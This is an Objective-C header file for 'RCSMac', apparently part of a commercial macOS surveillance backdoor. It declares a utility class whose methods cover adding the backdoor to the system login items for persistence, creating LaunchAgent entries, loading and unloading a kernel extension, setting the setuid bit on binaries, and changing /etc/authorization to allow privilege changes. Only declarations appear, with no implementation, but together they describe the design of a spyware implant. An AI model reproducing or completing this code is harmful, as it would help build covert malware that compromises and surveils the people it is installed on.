/*
 * RCSMac - Utils
 *
 * Created by Alfredo 'revenge' Pesoli on 27/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMUtils_h__
#define __RCSMUtils_h__


//
// This class is a singleton
//
@interface RCSMUtils : NSObject
{
@private
  NSString *mBackdoorPath;
  NSString *mKextPath;
  NSString *mSLIPlistPath;
  NSString *mServiceLoaderPath;
  NSString *mExecFlag;
}

@property (readwrite, retain) NSString *mBackdoorPath;
@property (readwrite, retain) NSString *mKextPath;
@property (readwrite, retain) NSString *mSLIPlistPath;
@property (readwrite, retain) NSString *mServiceLoaderPath;
@property (readwrite, retain) NSString *mExecFlag;

+ (RCSMUtils *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;

- (id)copyWithZone:  (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

// 
// Execute a system command
// Arguments can be nil
//
- (void)executeTask: (NSString *)anAppPath
      withArguments: (NSArray *)arguments
       waitUntilEnd: (BOOL)waitForExecution;

//
// Add an entry to the global SLI plist file for our backdoor
//
- (BOOL)addBackdoorToSLIPlist;
- (BOOL)removeBackdoorFromSLIPlist;

// 
// Search the global SLI plist file for the given key, used for verifying if
// the backdoor is already present in the file
//
- (BOOL)searchSLIPlistForKey: (NSString *)aKey;

//
// Save the global SLI plist file
//
- (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath;

//
// Create the global SLI plist file from scratch
//
- (BOOL)createSLIPlistWithBackdoor;

//
// Create the launchctl plist file used for launching the Kext Loader script
//
- (BOOL)createLaunchAgentPlist: (NSString *)aLabel;

//
// Create the bash script which will load our backdoor from LaunchDaemons
//
#if 0
- (BOOL)createBackdoorLoader;
#endif

//
// Return YES if the backdoor has been already added to the global SLI file
//
- (BOOL)isBackdoorPresentInSLI: (NSString *)aKey;

//
// Open the System Login Items plist
//
- (id)openSLIPlist;

//
// Make a binary suid
//
- (BOOL)makeSuidBinary: (NSString *)aBinary;

//
// Drop the execution flag which tells the backdoor that it has been executed
// at least once
//
- (BOOL)dropExecFlag;

//
// Load our kext
//
- (BOOL)loadKext;

//
// Unload our kext
//
- (BOOL)unloadKext;

//
// Enable system.privilege.setugid_appkit in /etc/authorization
//
- (BOOL)enableSetugidAuth;

//
// Disable system.privilege.setugid_appkit in /etc/authorization
//
- (BOOL)disableSetugidAuth;

@end

#endif